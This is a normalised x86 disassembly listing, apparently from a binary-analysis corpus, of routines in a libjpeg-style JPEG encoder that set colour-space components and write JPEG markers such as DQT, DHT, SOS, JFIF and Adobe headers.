xor eax eax
mov [ ebx + 0xb4 ] eax
xor edx edx
mov [ ebx + 0xb8 ] edx
xor ecx ecx
mov [ ebx + 0xbc ] ecx
xor eax eax
mov [ ebx + 0xc0 ] eax
xor edx edx
mov [ ebx + 0xc4 ] edx
mov [ ebx + 0xcc ] 0x0
mov [ ebx + 0xcd ] 0x1
mov [ ebx + 0xcf ] 0x1
mov eax ebx
call sub_46492c
pop esi
pop ebx
retn
mov [ ebx + 0xb0 ] 0x1
sub_46492c
mov edx [ eax + 0x24 ]
cmp edx 0x5
ja r-xdata
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x7
mov edx [ eax ]
call [ edx ]
retn
jmp [ edx * 4 + jump_table_46493b ]
mov edx 0x1
call sub_4649a0
retn
mov edx 0x3
call sub_4649a0
retn
mov edx 0x3
call sub_4649a0
retn
mov edx 0x4
call sub_4649a0
retn
mov edx 0x5
call sub_4649a0
retn
xor edx edx
call sub_4649a0
retn
sub_4649a0
push ebx
mov ebx eax
push esi
mov esi edx
cmp [ ebx + 0x10 ] 0x64
je r-xdata
mov [ ebx + 0x38 ] esi
xor ecx ecx
mov [ ebx + 0xc8 ] ecx
xor eax eax
mov [ ebx + 0xd1 ] eax
cmp esi 0x5
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
jmp [ esi * 4 + jump_table_4649e4 ]
mov [ ebx + 0xc8 ] 0x1
mov [ ebx + 0x34 ] 0x1
mov eax [ ebx + 0x3c ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x1
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
pop esi
pop ebx
retn
mov [ ebx + 0xd1 ] 0x1
mov [ ebx + 0x34 ] 0x3
mov eax [ ebx + 0x3c ]
xor ecx ecx
xor edx edx
mov [ eax ] 0x52
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
mov eax [ ebx + 0x3c ]
xor edx edx
add eax 0x54
xor ecx ecx
mov [ eax ] 0x47
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x3c ]
xor ecx ecx
add eax 0xa8
xor edx edx
mov [ eax ] 0x42
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
pop esi
pop ebx
retn
mov [ ebx + 0xc8 ] 0x1
mov [ ebx + 0x34 ] 0x3
mov eax [ ebx + 0x3c ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x1
mov [ eax + 0x8 ] 0x2
mov [ eax + 0xc ] 0x2
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x3c ]
add eax 0x54
mov [ eax ] 0x2
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
mov eax [ ebx + 0x3c ]
add eax 0xa8
mov [ eax ] 0x3
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
pop esi
pop ebx
retn
mov [ ebx + 0xd1 ] 0x1
mov [ ebx + 0x34 ] 0x4
mov eax [ ebx + 0x3c ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x43
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x3c ]
xor ecx ecx
add eax 0x54
xor edx edx
mov [ eax ] 0x4d
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
mov eax [ ebx + 0x3c ]
xor edx edx
add eax 0xa8
xor ecx ecx
mov [ eax ] 0x59
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x3c ]
xor ecx ecx
add eax 0xfc
xor edx edx
mov [ eax ] 0x4b
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
pop esi
pop ebx
retn
mov [ ebx + 0xd1 ] 0x1
mov [ ebx + 0x34 ] 0x4
mov eax [ ebx + 0x3c ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x1
mov [ eax + 0x8 ] 0x2
mov [ eax + 0xc ] 0x2
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x3c ]
xor edx edx
add eax 0x54
xor ecx ecx
mov [ eax ] 0x2
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
mov eax [ ebx + 0x3c ]
add eax 0xa8
mov [ eax ] 0x3
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
mov eax [ ebx + 0x3c ]
add eax 0xfc
mov [ eax ] 0x4
mov [ eax + 0x8 ] 0x2
mov [ eax + 0xc ] 0x2
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
pop esi
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x34 ] eax
mov eax [ ebx + 0x34 ]
cmp eax 0x1
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x18
mov edx [ ebx + 0x34 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0xa
jle r-xdata
cmp edx [ ebx + 0x34 ]
jl r-xdata
xor edx edx
jmp r-xdata
lea eax [ edx + edx * 4 ]
xor ecx ecx
lea eax [ edx + eax * 4 ]
shl eax 0x2
add eax [ ebx + 0x3c ]
mov [ eax ] edx
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x18 ] ecx
inc edx
pop esi
pop ebx
retn
sub_464d58
push ebp
mov ebp esp
mov [ eax ] 0x1
mov [ eax + 0x4 ] edx
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x10 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
add eax 0x24
pop ebp
retn 0xc
sub_464d80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov [ eax ] 0x1
mov [ eax + 0x4 ] ebx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] esi
mov edi [ ebp + 0xc ]
inc ebx
mov [ eax + 0x1c ] edi
mov edi [ ebp + 0x8 ]
mov [ eax + 0x20 ] edi
add eax 0x24
cmp edx ebx
jg r-xdata
sub_464dbc
push ebp
mov ebp esp
push ebx
push esi
cmp edx 0x4
jg r-xdata
push 0x0
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
xor ecx ecx
call sub_464d80
mov [ eax ] edx
xor ebx ebx
lea esi [ eax + 0x4 ]
cmp edx ebx
jle r-xdata
xor edx edx
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x20 ] ecx
add eax 0x24
jmp r-xdata
mov [ esi ] ebx
inc ebx
add esi 0x4
cmp edx ebx
jg r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
sub_464e08
push ebx
push esi
push edi
mov edi eax
push ecx
cmp [ edi + 0x10 ] 0x64
mov esi [ edi + 0x34 ]
je r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ edi ]
mov [ eax + 0x14 ] 0x12
mov edx [ edi + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jle r-xdata
cmp [ edi + 0x38 ] 0x3
jne r-xdata
mov eax esi
shl eax 0x2
add eax 0x2
mov [ esp ] eax
mov ecx esi
add ecx ecx
lea ecx [ ecx + ecx * 2 ]
mov [ esp ] ecx
jmp r-xdata
mov [ esp ] 0xa
jmp r-xdata
push 0x1
xor ecx ecx
mov edx esi
mov eax ebx
call sub_464dbc
mov ebx eax
push 0x5
push 0x0
push 0x2
mov ecx 0x1
mov edx esi
mov eax ebx
call sub_464d80
mov ebx eax
push 0x3f
push 0x0
push 0x2
mov ecx 0x6
mov edx esi
mov eax ebx
call sub_464d80
mov ebx eax
push 0x3f
push 0x2
push 0x1
mov ecx 0x1
mov edx esi
mov eax ebx
call sub_464d80
mov ebx eax
push 0x0
mov ecx 0x1
mov edx esi
mov eax ebx
call sub_464dbc
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
mov edx esi
mov eax ebx
call sub_464d80
cmp [ edi + 0x38 ] 0x3
jne r-xdata
mov ecx [ esp ]
mov eax edi
shl ecx 0x2
xor edx edx
mov ebx [ eax + 0x4 ]
lea ecx [ ecx + ecx * 8 ]
call [ ebx ]
mov ebx eax
cmp esi 0x3
mov [ edi + 0xa4 ] ebx
mov eax [ esp ]
mov [ edi + 0xa0 ] eax
jne r-xdata
push 0x1
xor ecx ecx
mov edx esi
mov eax ebx
call sub_464dbc
mov ebx eax
push 0x5
push 0x0
push 0x2
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_464d58
mov ebx eax
push 0x3f
push 0x0
push 0x1
mov ecx 0x1
mov edx 0x2
mov eax ebx
call sub_464d58
mov ebx eax
push 0x3f
push 0x0
push 0x1
mov ecx 0x1
mov edx 0x1
mov eax ebx
call sub_464d58
mov ebx eax
push 0x3f
push 0x0
push 0x2
mov ecx 0x6
xor edx edx
mov eax ebx
call sub_464d58
mov ebx eax
push 0x3f
push 0x2
push 0x1
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_464d58
mov ebx eax
push 0x0
mov ecx 0x1
mov edx esi
mov eax ebx
call sub_464dbc
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
mov edx 0x2
mov eax ebx
call sub_464d58
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
mov edx 0x1
mov eax ebx
call sub_464d58
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_464d58
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_464fec
push ebx
mov ebx eax
push esi
mov esi edx
cmp [ ebx + 0x10 ] 0x64
je r-xdata
test esi esi
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x14 ]
call [ edx + 0x8 ]
mov eax ebx
call sub_46c5ec
mov eax ebx
mov edx [ eax + 0x141 ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0xd5 ] ecx
mov eax 0x66
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
xor edx edx
mov eax ebx
call sub_46528c
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
dec eax
sub_465058
push ebx
mov ebx eax
push esi
push edi
push ecx
mov edi edx
cmp [ ebx + 0x10 ] 0x65
mov esi ecx
je r-xdata
mov ecx [ ebx + 0xd5 ]
cmp ecx [ ebx + 0x1c ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x77
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov ecx [ ebx + 0x141 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xd5 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x1c ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
mov eax [ ebx + 0x1c ]
sub eax [ ebx + 0xd5 ]
cmp eax esi
jae r-xdata
mov eax ebx
mov edx [ eax + 0x141 ]
call [ edx + 0x4 ]
xor eax eax
mov edx edi
mov [ esp ] eax
mov eax ebx
push esi
lea ecx [ esp + 0x4 ]
mov esi [ eax + 0x145 ]
call [ esi + 0x4 ]
mov eax [ esp ]
add [ ebx + 0xd5 ] eax
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov esi eax
sub_465108
push ebx
mov ebx eax
push esi
push edi
push ebp
mov ebp ecx
cmp [ ebx + 0x10 ] 0x66
mov edi edx
je r-xdata
mov ecx [ ebx + 0xd5 ]
cmp ecx [ ebx + 0x1c ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x77
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x141 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xd5 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x1c ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0xe1 ]
shl esi 0x3
cmp esi ebp
jbe r-xdata
mov eax ebx
mov edx [ eax + 0x141 ]
call [ edx + 0x4 ]
mov edx edi
mov eax ebx
mov ecx [ eax + 0x14d ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x15
mov eax ebx
mov edx [ eax ]
call [ edx ]
add [ ebx + 0xd5 ] esi
mov eax esi
xor eax eax
jmp r-xdata
sub_4651c4
push ebx
mov ebx eax
xor eax eax
push esi
mov esi ecx
mov [ ebx + 0x4 ] eax
cmp edx 0x3d
je r-xdata
cmp esi 0x165
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xa
mov [ eax + 0x18 ] 0x3d
mov [ eax + 0x1c ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi [ ebx ]
push 0x165
push 0x0
push ebx
call sub_46a318
add esp 0xc
mov [ ebx ] esi
xor eax eax
mov [ ebx + 0xc ] eax
mov eax ebx
call sub_45a950
xor edx edx
xor ecx ecx
mov [ ebx + 0x8 ] edx
mov [ ebx + 0x14 ] ecx
xor eax eax
lea edx [ ebx + 0x40 ]
mov [ ebx + 0x3c ] eax
xor eax eax
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x13
mov [ eax + 0x18 ] 0x165
mov [ eax + 0x1c ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
xor ecx ecx
inc eax
mov [ edx ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
xor eax eax
lea edx [ ebx + 0x50 ]
xor ecx ecx
inc eax
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x10 ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
xor eax eax
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x3ff00000
mov [ ebx + 0x10 ] 0x64
pop esi
pop ebx
retn
sub_46528c
push ebx
push esi
xor ecx ecx
lea ebx [ eax + 0x40 ]
inc ecx
add ebx 0x4
cmp ecx 0x4
jl r-xdata
mov [ esi + 0x80 ] edx
mov esi [ ebx ]
test esi esi
je r-xdata
xor ecx ecx
add eax 0x50
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
mov [ ebx + 0x111 ] edx
inc ecx
add eax 0x4
cmp ecx 0x4
jl r-xdata
mov [ ebx + 0x111 ] edx
mov ebx [ eax ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub_4652d4
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x10 ]
cmp eax 0x65
je r-xdata
mov edx [ ebx + 0xd5 ]
cmp edx [ ebx + 0x1c ]
jae r-xdata
cmp eax 0x66
jne r-xdata
mov eax ebx
mov edx [ eax + 0x141 ]
call [ edx + 0x8 ]
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x42
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x10 ] 0x67
je r-xdata
mov ecx [ ebx + 0x141 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x141 ]
call [ edx ]
xor esi esi
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x151 ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x14 ]
call [ edx + 0x10 ]
mov eax ebx
call sub_4644ec
pop esi
pop ebx
retn
cmp esi [ ebx + 0xe5 ]
jb r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax + 0x141 ]
call [ edx + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x14d ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov [ eax + 0x4 ] esi
mov edx [ ebx + 0xe5 ]
mov [ eax + 0x8 ] edx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
inc esi
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x16
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4653b0
push ebp
mov ebp esp
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0xd5 ] 0x0
mov edi ecx
mov esi edx
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x10 ]
cmp eax 0x65
je r-xdata
mov eax ebx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edi
mov ebx [ eax + 0x151 ]
mov edx esi
call [ ebx ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp eax 0x66
je r-xdata
cmp eax 0x67
je r-xdata
sub_465408
push ebx
mov ebx eax
cmp [ ebx + 0x10 ] 0x64
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x14 ]
call [ edx + 0x8 ]
mov eax ebx
call sub_465bf8
mov eax ebx
mov edx [ eax + 0x151 ]
call [ edx + 0x14 ]
mov eax ebx
mov edx [ eax + 0x14 ]
call [ edx + 0x10 ]
mov eax ebx
call sub_4644ec
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_465458
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
inc [ eax ]
mov [ ecx ] dl
dec [ eax + 0x4 ]
jne r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x16
mov edx [ eax ]
call [ edx ]
sub_465488
push ebx
push esi
mov esi edx
mov ebx eax
mov edx 0xff
mov eax ebx
call sub_465458
mov edx esi
mov eax ebx
call sub_465458
pop esi
pop ebx
retn
sub_4654a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
sar edx 0x8
and edx 0xff
call sub_465458
mov edx esi
mov eax ebx
and edx 0xff
call sub_465458
pop esi
pop ebx
retn
sub_4654d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] edx
mov esi eax
mov eax [ esp ]
mov ebp [ esi + eax * 4 + 0x40 ]
test ebp ebp
jne r-xdata
xor edi edi
xor ebx ebx
mov eax ebp
mov eax [ esi ]
mov [ eax + 0x14 ] 0x33
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
inc ebx
add eax 0x2
cmp ebx 0x40
jl r-xdata
mov edi 0x1
cmp [ eax ] 0xff
jbe r-xdata
cmp [ ebp + 0x80 ] 0x0
jne r-xdata
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx 0xdb
mov eax esi
call sub_465488
mov edx 0x83
test edi edi
jne r-xdata
mov eax esi
call sub_4654a8
mov edx edi
mov eax esi
shl edx 0x4
add edx [ esp ]
call sub_465458
mov [ esp + 0x8 ] rw-data
xor ebx ebx
add edx 0xffffffc0
mov edx [ esp + 0x4 ]
mov eax esi
and edx 0xff
call sub_465458
inc ebx
add [ esp + 0x8 ] 0x4
cmp ebx 0x40
jl r-xdata
mov edx [ esp + 0x4 ]
mov eax esi
shr edx 0x8
call sub_465458
mov eax [ esp + 0x8 ]
test edi edi
mov edx [ eax ]
movzx ecx [ ebp + edx * 2 ]
mov [ esp + 0x4 ] ecx
je r-xdata
mov [ ebp + 0x80 ] 0x1
sub_4655b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] edx
mov esi eax
test ecx ecx
je r-xdata
mov eax [ esp ]
mov edi [ esi + eax * 4 + 0x50 ]
mov eax [ esp ]
mov edi [ esi + eax * 4 + 0x60 ]
add [ esp ] 0x10
jmp r-xdata
cmp [ edi + 0x111 ] 0x0
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x31
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
test edi edi
jne r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx 0xc4
mov eax esi
call sub_465488
xor ebp ebp
mov ebx 0x1
lea eax [ edi + 0x1 ]
xor edx edx
inc ebx
mov dl [ eax ]
inc eax
add ebp edx
cmp ebx 0x10
jle r-xdata
lea edx [ ebp + 0x13 ]
mov eax esi
call sub_4654a8
mov edx [ esp ]
mov eax esi
call sub_465458
mov ebx 0x1
lea eax [ edi + 0x1 ]
mov [ esp + 0x4 ] eax
mov edx [ esp + 0x4 ]
movzx edx [ edx ]
mov eax esi
call sub_465458
inc ebx
inc [ esp + 0x4 ]
cmp ebx 0x10
jle r-xdata
xor ebx ebx
lea eax [ edi + 0x11 ]
mov [ esp + 0x8 ] eax
cmp ebp ebx
jle r-xdata
mov [ edi + 0x111 ] 0x1
mov edx [ esp + 0x8 ]
movzx edx [ edx ]
mov eax esi
call sub_465458
inc ebx
inc [ esp + 0x8 ]
cmp ebp ebx
jg r-xdata
sub_465690
push ebx
mov ebx eax
mov edx 0xdd
mov eax ebx
call sub_465488
mov edx 0x4
mov eax ebx
call sub_4654a8
mov edx [ ebx + 0xc0 ]
mov eax ebx
call sub_4654a8
pop ebx
retn
sub_4656bc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_465488
mov edx [ ebx + 0x34 ]
mov eax ebx
lea edx [ edx + edx * 2 ]
add edx 0x8
call sub_4654a8
cmp [ ebx + 0x1c ] 0xffff
jg r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x28
mov [ eax + 0x18 ] 0xffff
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x18 ] 0xffff
jle r-xdata
cmp edi [ ebx + 0x34 ]
jl r-xdata
mov edx [ ebx + 0x30 ]
mov eax ebx
call sub_465458
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_4654a8
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_4654a8
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_465458
xor edi edi
mov esi [ ebx + 0x3c ]
jmp r-xdata
mov edx [ esi ]
mov eax ebx
call sub_465458
mov edx [ esi + 0x8 ]
mov eax ebx
shl edx 0x4
add edx [ esi + 0xc ]
call sub_465458
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_465458
inc edi
add esi 0x54
pop edi
pop esi
pop ebx
retn
sub_465760
push ebx
push esi
push edi
push ebp
mov ebx eax
mov edx 0xda
mov eax ebx
call sub_465488
mov edx [ ebx + 0xe9 ]
mov eax ebx
add edx edx
add edx 0x6
call sub_4654a8
mov edx [ ebx + 0xe9 ]
mov eax ebx
call sub_465458
xor ebp ebp
lea edi [ ebx + 0xed ]
jmp r-xdata
cmp ebp [ ebx + 0xe9 ]
jl r-xdata
mov esi [ edi ]
mov eax ebx
mov edx [ esi ]
call sub_465458
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x18 ]
cmp [ ebx + 0xd9 ] 0x0
je r-xdata
mov edx [ ebx + 0x131 ]
mov eax ebx
call sub_465458
mov edx [ ebx + 0x135 ]
mov eax ebx
call sub_465458
mov edx [ ebx + 0x139 ]
mov eax ebx
shl edx 0x4
add edx [ ebx + 0x13d ]
call sub_465458
pop ebp
pop edi
pop esi
pop ebx
retn
shl eax 0x4
add edx eax
mov eax ebx
call sub_465458
inc ebp
add edi 0x4
cmp [ ebx + 0x131 ] 0x0
jne r-xdata
xor eax eax
xor edx edx
cmp [ ebx + 0x139 ] 0x0
je r-xdata
cmp [ ebx + 0xac ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_465828
push ebx
mov ebx eax
mov edx 0xe0
mov eax ebx
call sub_465488
mov edx 0x10
mov eax ebx
call sub_4654a8
mov edx 0x4a
mov eax ebx
call sub_465458
mov edx 0x46
mov eax ebx
call sub_465458
mov edx 0x49
mov eax ebx
call sub_465458
mov edx 0x46
mov eax ebx
call sub_465458
xor edx edx
mov eax ebx
call sub_465458
mov edx 0x1
mov eax ebx
call sub_465458
mov edx 0x1
mov eax ebx
call sub_465458
xor edx edx
mov eax ebx
mov dl [ ebx + 0xcc ]
call sub_465458
movzx edx [ ebx + 0xcd ]
mov eax ebx
call sub_4654a8
movzx edx [ ebx + 0xcf ]
mov eax ebx
call sub_4654a8
xor edx edx
mov eax ebx
call sub_465458
xor edx edx
mov eax ebx
call sub_465458
pop ebx
retn
sub_4658d4
push ebx
mov ebx eax
mov edx 0xee
mov eax ebx
call sub_465488
mov edx 0xe
mov eax ebx
call sub_4654a8
mov edx 0x41
mov eax ebx
call sub_465458
mov edx 0x64
mov eax ebx
call sub_465458
mov edx 0x6f
mov eax ebx
call sub_465458
mov edx 0x62
mov eax ebx
call sub_465458
mov edx 0x65
mov eax ebx
call sub_465458
mov edx 0x64
mov eax ebx
call sub_4654a8
xor edx edx
mov eax ebx
call sub_4654a8
xor edx edx
mov eax ebx
call sub_4654a8
mov ecx [ ebx + 0x38 ]
sub ecx 0x3
je r-xdata
mov edx 0x1
mov eax ebx
call sub_465458
pop ebx
retn
sub ecx 0x2
je r-xdata
mov edx 0x2
mov eax ebx
call sub_465458
pop ebx
retn
jmp r-xdata
xor edx edx
mov eax ebx
call sub_465458
pop ebx
retn
sub_465980
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi eax
mov esi [ ebp + 0x8 ]
cmp esi 0xfffd
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
call sub_465488
lea edx [ esi + 0x2 ]
mov eax edi
call sub_4654a8
jmp r-xdata
mov edx esi
add esi 0xffffffff
test edx edx
jne r-xdata
xor edx edx
mov eax edi
mov dl [ ebx ]
call sub_465458
inc ebx
sub_4659c4
push ebx
mov ebx eax
mov edx 0xd8
mov eax ebx
call sub_465488
cmp [ ebx + 0xc8 ] 0x0
je r-xdata
cmp [ ebx + 0xd1 ] 0x0
je r-xdata
mov eax ebx
call sub_465828
pop ebx
retn
mov eax ebx
call sub_4658d4
sub_4659f8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
xor edi edi
mov esi [ ebx + 0x3c ]
jmp r-xdata
